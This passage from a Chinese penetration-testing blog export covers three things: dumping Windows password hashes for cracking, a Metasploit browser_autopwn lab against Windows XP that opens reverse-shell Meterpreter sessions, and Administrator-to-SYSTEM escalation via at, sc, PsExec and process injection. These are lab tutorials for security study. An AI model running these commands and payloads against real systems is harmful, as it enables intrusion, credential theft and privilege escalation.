class="built_in">which</span> to write the output</span><br><span class="line">  <span class="built_in">where</span> -u specifies the user name used to connect to the target</span><br><span class="line">  <span class="built_in">where</span> -p specifies the password used to connect to the target</span><br><span class="line">  <span class="built_in">where</span> -s specifies the share to be used on the target, rather than searching <span class="keyword">for</span> one</span><br><span class="line">  <span class="built_in">where</span> -n skips password histories</span><br><span class="line">  <span class="built_in">where</span> -x targets a 64-bit host</span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214162351439-1693124636.png" /></p>
<p><strong>Windows下password加密方式为LM-Hash（如：44EF
……4EE）与NTLM-Hash（如：32ED……8D4），</strong>LM，NTML，NET-
NTLM2理解及hash破解：<a
href="https://www.cnblogs.com/junsec/p/11810703.html"
class="uri">https://www.cnblogs.com/junsec/p/11810703.html</a></p>
<p><strong>将用户名，密文复制下来，单独存个.pwdump文件，利用Kali中的解密工具解密。</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214163911291-43544348.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214164245340-1302221876.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器渗透以 browser autopwn 攻击为例</title>
    <url>/2021/12/07/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%97%E9%80%8F%E4%BB%A5%20browser%20autopwn%20%E6%94%BB%E5%87%BB%E4%B8%BA%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="browser-autopwn攻击">1. browser autopwn攻击</h2>
<p><strong>原理</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211207182106184-1912346437.png" /></p>
<h2 id="实验环境">2. 实验环境</h2>
<p><strong>攻击机（服务器）：kali 2019.3</strong></p>
<p><strong>靶机（受害者）：winXP</strong></p>
<h2 id="实验步骤">3. 实验步骤</h2>
<h3 id="kali-操作">1、Kali 操作</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/browser_autopwn</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt;show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/browser_autopwn):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   LHOST                     <span class="built_in">yes</span>       The IP address to use <span class="keyword">for</span> reverse-connect payloads</span><br><span class="line">   SRVHOST  0.0.0.0          <span class="built_in">yes</span>       The <span class="built_in">local</span> host to listen on. This must be an address on the <span class="built_in">local</span> machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             <span class="built_in">yes</span>       The <span class="built_in">local</span> port to listen on.</span><br><span class="line">   SSL      <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name       Description</span><br><span class="line">   ----       -----------</span><br><span class="line">   WebServer  Start a bunch of modules and direct clients to appropriate exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; <span class="built_in">set</span> srvhost 10.10.10.155</span><br><span class="line">srvhost =&gt; 10.10.10.155 msf5 auxiliary(server /browser_autopwn) &gt; <span class="built_in">set</span> lhost 10.10.10.155</span><br><span class="line">lhost =&gt; 10.10.10.155 msf5 auxiliary(server /browser_autopwn) &gt; <span class="built_in">set</span> URIPATH /</span><br><span class="line">URIPATH =&gt; / msf5 auxiliary(server /browser_autopwn) &gt;exploit </span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Setup</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; </span><br><span class="line">[*] Starting exploit modules on host 10.10.10.155...</span><br><span class="line">[*] ---</span><br><span class="line"></span><br><span class="line">[*] Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/qOnCM</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/firefox_proto_crmfrequest with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/LKtM</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/firefox_tostring_console_injection with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/Plrmb</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/firefox_webidl_injection with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/OLrJlXl</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_atomicreferencearray with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/DGMKpkzgl</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_jre17_jmxbean with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/vxSkgPKnuw</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_jre17_provider_skeleton with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/qFeUdwupePC</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_jre17_reflection_types with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/IglhJsmnNeL</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_rhino with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/QVlrRXkqoDlY</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_verifier_field_access with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/mAcrliKw</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/opera_configoverwrite with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/IgQvQD</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/adobe_flash_mp4_cprt with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/kSfNK</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/adobe_flash_rtmp with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/mwwNxNpLenMHX</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ie_cgenericelement_uaf with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/qgSKzGkMm</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/oUBVvezFfKcd</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ie_execcommand_uaf with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/DMZgEQHCUT</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/mozilla_nstreerange with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/iTUVRf</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ms13_080_cdisplaypointer with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/cGsnYd</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ms13_090_cardspacesigninhelper with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/eCSchQ</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/msxml_get_definition_code_exec with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Starting handler <span class="keyword">for</span> windows/meterpreter/reverse_tcp on port 3333</span><br><span class="line">[*] Starting handler <span class="keyword">for</span> generic/shell_reverse_tcp on port 6666</span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.155:3333 </span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/UOaOFkJ</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting handler <span class="keyword">for</span> java/meterpreter/reverse_tcp on port 7777</span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.155:6666 </span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.155:7777 </span><br><span class="line"></span><br><span class="line">[*] --- Done, found 20 exploit modules</span><br><span class="line"></span><br><span class="line">    [*] Using URL: http://10.10.10.155:8080/</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
<h3 id="受害者访问服务器">2、受害者访问服务器</h3>
<p><strong>使用winXP的ie访问 http://10.10.10.155:8080/</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211207182242787-741332284.png" /></p>
<h3 id="kali-效果">3、Kali 效果</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Handling <span class="string">&#x27;/&#x27;</span></span><br><span class="line">[*] Handling <span class="string">&#x27;/?sessid=V2luZG93cyBYUDp1bmRlZmluZWQ6dW5kZWZpbmVkOnVuZGVmaW5lZDpTUDI6emgtY246eDg2Ok1TSUU6Ni4wOg%3d%3d&#x27;</span></span><br><span class="line">[*] JavaScript Report: Windows XP:undefined:undefined:undefined:SP2:zh-cn:x86:MSIE:6.0:</span><br><span class="line">[*] Responding with 14 exploits</span><br><span class="line">[*] 10.10.10.132     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability</span><br><span class="line">[*] 10.10.10.132     java_atomicreferencearray - Generated jar to drop (5304 bytes).</span><br><span class="line">[*] 10.10.10.132     java_jre17_jmxbean - handling request <span class="keyword">for</span> /vxSkgPKnuw</span><br><span class="line">[*] 10.10.10.132     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability</span><br><span class="line">…………</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.132</span><br><span class="line">[*] 10.10.10.132     java_jre17_provider_skeleton - handling request <span class="keyword">for</span> /qFeUdwupePC</span><br><span class="line">[*] 10.10.10.132     java_jre17_reflection_types - handling request <span class="keyword">for</span> /IglhJsmnNeL/</span><br><span class="line">[*] 10.10.10.132     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request</span><br><span class="line">[*] 10.10.10.132     java_verifier_field_access - Sending Java Applet Field Bytecode Verifier Cache Remote Code Execution</span><br><span class="line">[*] 10.10.10.132     java_verifier_field_access - Generated jar to drop (5304 bytes).</span><br><span class="line">[*] 10.10.10.132     java_jre17_provider_skeleton - handling request <span class="keyword">for</span> /qFeUdwupePC/</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.155:3333 -&gt; 10.10.10.132:1203) at 2021-10-06 03:33:53 -0400</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.132</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.10.155:3333 -&gt; 10.10.10.132:1204) at 2021-10-06 03:34:09 -0400</span><br><span class="line">[*] Session ID 1 (10.10.10.155:3333 -&gt; 10.10.10.132:1203) processing InitialAutoRunScript <span class="string">&#x27;migrate -f&#x27;</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.</span><br><span class="line">[!] Example: run post/windows/manage/migrate OPTION=value [...]</span><br><span class="line">[*] Current server process: FTTwbkTSNceYy.exe (3724)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 968</span><br><span class="line">[*] Session ID 2 (10.10.10.155:3333 -&gt; 10.10.10.132:1204) processing InitialAutoRunScript <span class="string">&#x27;migrate -f&#x27;</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.</span><br><span class="line">[!] Example: run post/windows/manage/migrate OPTION=value [...]</span><br><span class="line">[*] Current server process: unZbEFCawVoIclyNztFCwJ.exe (3732)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 1024 [ +] Successfully migrated to process </span><br><span class="line"></span><br><span class="line">    msf5 auxiliary(server/browser_autopwn) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                             Connection</span><br><span class="line">  --  ----  ----                     -----------                             ----------</span><br><span class="line">  1         meterpreter x86/windows  WINXP-Z9M8R8-1\z9m8r8 @ WINXP-Z9M8R8-1  10.10.10.155:3333 -&gt; 10.10.10.132:1203 (10.10.10.132)</span><br><span class="line">  2         meterpreter x86/windows  WINXP-Z9M8R8-1\z9m8r8 @ WINXP-Z9M8R8-1  10.10.10.155:3333 -&gt; 10.10.10.132:1204 (10.10.10.132)</span><br><span class="line">      msf5 auxiliary(server/browser_autopwn) &gt; sessions -i 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">    meterpreter&gt;ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System             x86   0        NT AUTHORITY\SYSTEM           </span><br><span class="line"> 188   664   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe</span><br><span class="line">192   1484  conime.exe         x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\WINDOWS\system32\conime.exe</span><br><span class="line">808   1508  pythonw.exe        x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\Python27\pythonw.exe</span><br><span class="line">1508  1484  explorer.exe       x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\WINDOWS\Explorer.EXE</span><br><span class="line">…………</span><br><span class="line">      meterpreter&gt; migrate  1508</span><br><span class="line">[*] Migrating from 1024 to 1508...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">    meterpreter&gt; </span><br></pre></td></tr></table></figure>
<h3 id="后渗透攻击">4、后渗透攻击</h3>
<p><strong>提权，部署后门，清理痕迹等，此处不再演示，可参考该系列其他笔记</strong></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之提权：利用 Windows 系统命令和进程注入提权</title>
    <url>/2022/02/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%20Windows%20%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="本地提权">1. 本地提权</h2>
<p><strong>• 已实现本地低权限账号登录</strong></p>
<p>• 远程溢出</p>
<p>• 直接获得账号密码</p>
<p><strong>• 希望获取更高权限</strong></p>
<p>• 实现对目标进一步控制</p>
<p><strong>• 系统账号之间权限隔离</strong></p>
<p>• 操作系统安全的基础</p>
<p>• 用户空间</p>
<p>• 内核空间</p>
<p><strong>• 系统账号</strong></p>
<p>• 用户账号登陆时获取权限令牌</p>
<p>• 服务账号无需用户登陆已在后台启动服务</p>
<p><strong>• Windows</strong></p>
<p>• user</p>
<p>• Administrator</p>
<p>• System</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213115539306-794303017.png" /></p>
<p><strong>• Linux</strong></p>
<p>• User</p>
<p>• Root</p>
<h2 id="admin提权为system">2. ADMIN提权为SYSTEM</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213120348969-25317382.png" /></p>
<p><strong>HelpAssistant账户</strong></p>
<p>此帐户是在系统安装过程中创建并具有为远程协助操作准备功能,创建时被随意分配一个复杂的密码，随后被禁用。当远程协助邀请打开时，用户的电脑上会创建一个"邀请者"的票证，同时3389端口也会打开，并允许到终端服务的访问，这时HelpAssistant账户会被自动启用。启用后受邀者可以使用这个账户和创建的票证访问邀请者的计算机。如果所有的票证都被关闭或者过期，HelpAssistant账户会被再次自动被禁用，3389端口也会同时关闭。</p>
<p><strong>Support_388945a0 帐户</strong></p>
<p>此帐户存在使帮助和支持服务可以与签名脚本交互操作。主要用于控制对签名脚本（可以从帮助和支持服务内部访问）的访问权限。管理员可以使用此帐户来委派普通用户（对计算机没有管理权限）的能力，以便从嵌入帮助和支持服务内部的链接运行签名脚本。可以对这些脚本进行编程，以使Support_388945a0
帐户凭据（而不是用户凭据）在本地计算机上执行特定的管理操作，而普通用户的帐户不支持这种操作。当委派用户单击帮助和支持服务中的链接时，将在
Support_388945a0
帐户的安全上下文中执行脚本。此帐户对计算机具有有限的访问权限，并且在默认情况下是禁用的。</p>
<h3 id="at-命令">1、at 命令</h3>
<p>只能在XP与2003的系统上使用</p>
<p><strong>Help</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;at /?</span><br><span class="line">The AT <span class="built_in">command</span> schedules commands and programs to run on a computer at</span><br><span class="line">a specified time and <span class="built_in">date</span>. The Schedule service must be running to use</span><br><span class="line">the AT <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">AT [\\computername] [ [<span class="built_in">id</span>] [/DELETE] | /DELETE [/YES]]</span><br><span class="line">AT [\\computername] time [/INTERACTIVE]</span><br><span class="line">[ /EVERY:<span class="built_in">date</span>[,...] | /NEXT:<span class="built_in">date</span>[,...]] <span class="string">&quot;command&quot;</span></span><br><span class="line"></span><br><span class="line">\\computername     Specifies a remote computer. Commands are scheduled on the <span class="built_in">local</span> computer <span class="keyword">if</span> this parameter is omitted.</span><br><span class="line"><span class="built_in">id</span>                 Is an identification number assigned to a scheduled   <span class="built_in">command</span>.</span><br><span class="line">/delete            Cancels a scheduled <span class="built_in">command</span>. If <span class="built_in">id</span> is omitted, all the  scheduled commands on the computer are canceled.</span><br><span class="line">/yes               Used with cancel all <span class="built_in">jobs</span> <span class="built_in">command</span> when no further   confirmation is desired.</span><br><span class="line">time               Specifies the time when <span class="built_in">command</span> is to run.</span><br><span class="line">/interactive       Allows the job to interact with the desktop of the user <span class="built_in">who</span> is logged on at the time the job runs.</span><br><span class="line">/every:<span class="built_in">date</span>[,...]  Runs the <span class="built_in">command</span> on each specified day(s) of the week or month. If <span class="built_in">date</span> is omitted, the current day of the month   is assumed.</span><br><span class="line">/next:<span class="built_in">date</span>[,...]   Runs the specified <span class="built_in">command</span> on the next occurrence of the day (<span class="keyword">for</span> example, next Thursday). If <span class="built_in">date</span> is omitted, the  current day of the month is assumed.</span><br><span class="line"><span class="string">&quot;command&quot;</span>          Is the Windows NT <span class="built_in">command</span>, or batch program to be run.</span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;at 12:11 /interactive cmd　　　　<span class="comment">#/interactive  交互执行（也就是说咋们可以看得见，而不是后台运行）</span></span><br><span class="line">Added a new job with job ID = 1</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator&gt;at</span><br><span class="line">Status ID   Day                     Time          Command Line</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">        1   Today                   12:11 PM      cmd</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213121150658-1458434945.png" /></p>
<p><strong>当前cmd为system权限！</strong></p>
<p>使用taskmgr命令杀死现administrator权限下的桌面进程explorer，再重启explorer，则整个桌面进程将在system权限下。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213122101807-1589310294.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213122131341-1641677297.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213122242931-192384541.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213122437217-1541522278.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213122521033-1818465903.png" /></p>
<h3 id="sc-命令">2、sc 命令</h3>
<p><strong>示例</strong></p>
<p><strong>创建服务：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;sc Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>= interact  <span class="comment">#syscmd：创建的服务名，binPath：指定要执行的指令，cmd /K start：重新启动一个cmd窗口，own：创建账户所拥有，interact：交互</span></span><br><span class="line">[SC] CreateService SUCCESS</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213123529466-1922942535.png" /></p>
<p><strong>启动服务：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213124343185-2070558800.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure>
<p>通过命令行启动服务的指令，服务默认是由system账号启动的，所以执行该命令syscmd会去调用system账号去启动它</p>
<h3 id="提权工具">3、提权工具</h3>
<p>windows系统提供的套件（推荐将整个套件下载下来玩玩）：&lt;https://docs.microsoft.com/zh-
cn/sysinternals/downloads/&gt;</p>
<p><strong>具体工具：PsExec.exe</strong></p>
<p><strong>帮助信息：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;PsExec.exe</span><br><span class="line"></span><br><span class="line">PsExec v2.34 - Execute processes remotely</span><br><span class="line">Copyright (C) 2001-2021 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">PsExec executes a program on a remote system, <span class="built_in">where</span> remotely executed console</span><br><span class="line">applications execute interactively.</span><br><span class="line"></span><br><span class="line">Usage: psexec [\\computer[,computer2[,...] | @file]][-u user [-p psswd]][-n s][-</span><br><span class="line">r servicename][-h][-l][-s|-e][-x][-i [session]][-c [-f|-v]][-w directory][-d][-&lt;</span><br><span class="line">priority&gt;][-a n,n,...][-verbose] cmd [arguments]</span><br><span class="line">     -a         Separate processors on <span class="built_in">which</span> the application can run with</span><br><span class="line">                commas <span class="built_in">where</span> 1 is the lowest numbered CPU. For example,</span><br><span class="line">                to run the application on CPU 2 and CPU 4, enter:</span><br><span class="line">                <span class="string">&quot;-a 2,4&quot;</span></span><br><span class="line">     -c         Copy the specified program to the remote system <span class="keyword">for</span></span><br><span class="line">                execution. If you omit this option the application</span><br><span class="line">                must be <span class="keyword">in</span> the system path on the remote system.</span><br><span class="line">     -d         Don<span class="string">&#x27;t wait for process to terminate (non-interactive).</span></span><br><span class="line"><span class="string">     -e         Does not load the specified account&#x27;</span>s profile.</span><br><span class="line">     -f         Copy the specified program even <span class="keyword">if</span> the file already</span><br><span class="line">                exists on the remote system.</span><br><span class="line">     -i         Run the program so that it interacts with the desktop of the</span><br><span class="line">                specified session on the remote system. If no session is</span><br><span class="line">                specified the process runs <span class="keyword">in</span> the console session.</span><br><span class="line">     -h         If the target system is Vista or higher, has the process</span><br><span class="line">                run with the account<span class="string">&#x27;s elevated token, if available.</span></span><br><span class="line"><span class="string">     -l         Run process as limited user (strips the Administrators group</span></span><br><span class="line"><span class="string">                and allows only privileges assigned to the Users group).</span></span><br><span class="line"><span class="string">                On Windows Vista the process runs with Low Integrity.</span></span><br><span class="line"><span class="string">     -n         Specifies timeout in seconds connecting to remote computers.</span></span><br><span class="line"><span class="string">     -p         Specifies optional password for user name. If you omit this</span></span><br><span class="line"><span class="string">                you will be prompted to enter a hidden password.</span></span><br><span class="line"><span class="string">     -r         Specifies the name of the remote service to create or interact.</span></span><br><span class="line"><span class="string">                with.</span></span><br><span class="line"><span class="string">     -s         Run the remote process in the System account.</span></span><br><span class="line"><span class="string">     -u         Specifies optional user name for login to remote</span></span><br><span class="line"><span class="string">                computer.</span></span><br><span class="line"><span class="string">     -v         Copy the specified file only if it has a higher version number</span></span><br><span class="line"><span class="string">                or is newer on than the one on the remote system.</span></span><br><span class="line"><span class="string">     -w         Set the working directory of the process (relative to</span></span><br><span class="line"><span class="string">                remote computer).</span></span><br><span class="line"><span class="string">     -x         Display the UI on the Winlogon secure desktop (local system</span></span><br><span class="line"><span class="string">                only).</span></span><br><span class="line"><span class="string">     -arm       Specifies the remote computer is of ARM architecture.</span></span><br><span class="line"><span class="string">     -priority  Specifies -low, -belownormal, -abovenormal, -high or</span></span><br><span class="line"><span class="string">                -realtime to run the process at a different priority. Use</span></span><br><span class="line"><span class="string">                -background to run at low memory and I/O priority on Vista.</span></span><br><span class="line"><span class="string">     computer   Direct PsExec to run the application on the remote</span></span><br><span class="line"><span class="string">                computer or computers specified. If you omit the computer</span></span><br><span class="line"><span class="string">                name PsExec runs the application on the local system,</span></span><br><span class="line"><span class="string">                and if you specify a wildcard (\\*), PsExec runs the</span></span><br><span class="line"><span class="string">                command on all computers in the current domain.</span></span><br><span class="line"><span class="string">     @file      PsExec will execute the command on each of the computers listed</span></span><br><span class="line"><span class="string">                in the file.</span></span><br><span class="line"><span class="string">     cmd            Name of application to execute.</span></span><br><span class="line"><span class="string">     arguments  Arguments to pass (note that file paths must be</span></span><br><span class="line"><span class="string">                absolute paths on the target system).</span></span><br><span class="line"><span class="string">     -accepteula This flag suppresses the display of the license dialog.</span></span><br><span class="line"><span class="string">     -nobanner   Do not display the startup banner and copyright message.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can enclose applications that have spaces in their name with</span></span><br><span class="line"><span class="string">quotation marks e.g. psexec \\marklap &quot;c:\long name app.exe&quot;.</span></span><br><span class="line"><span class="string">Input is only passed to the remote system when you press the enter</span></span><br><span class="line"><span class="string">key, and typing Ctrl-C terminates the remote process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you omit a user name the process will run in the context of your</span></span><br><span class="line"><span class="string">account on the remote system, but will not have access to network</span></span><br><span class="line"><span class="string">resources (because it is impersonating). Specify a valid user name</span></span><br><span class="line"><span class="string">in the Domain\User syntax if the remote process requires access</span></span><br><span class="line"><span class="string">to network resources or to run in a different account. Note that</span></span><br><span class="line"><span class="string">the password and command is encrypted in transit to the remote system.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Error codes returned by PsExec are specific to the applications you</span></span><br><span class="line"><span class="string">execute, not PsExec.</span></span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213130541276-73467895.png" /></p>
<h2 id="注入进程提权">3. 注入进程提权</h2>
<p><strong>原理：</strong> 将自己的进程注入到 system
服务进程中，使其具有 system 账号权限（隐蔽性强）。</p>
<p>pinjector.exe进程注入器（外网）：<a
href="http://www.tarasco.org/security/Process_Injector/"
class="uri">http://www.tarasco.org/security/Process_Injector/</a></p>
<p><strong>帮助信息：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;pinjector.exe</span><br><span class="line">Privilege Switcher <span class="keyword">for</span> Win32(Private version)</span><br><span class="line">(c) 2006 Andres Tarasco - atarasco@gmail.com</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line"> inject.exe -l                    (Enumerate Credentials)</span><br><span class="line"> inject.exe -p &lt;pid&gt; &lt;cmd&gt; &lt;port&gt; (Inject into PID)</span><br></pre></td></tr></table></figure>
<p><strong>示例</strong></p>
<p><strong>查看可注入进程：</strong></p>
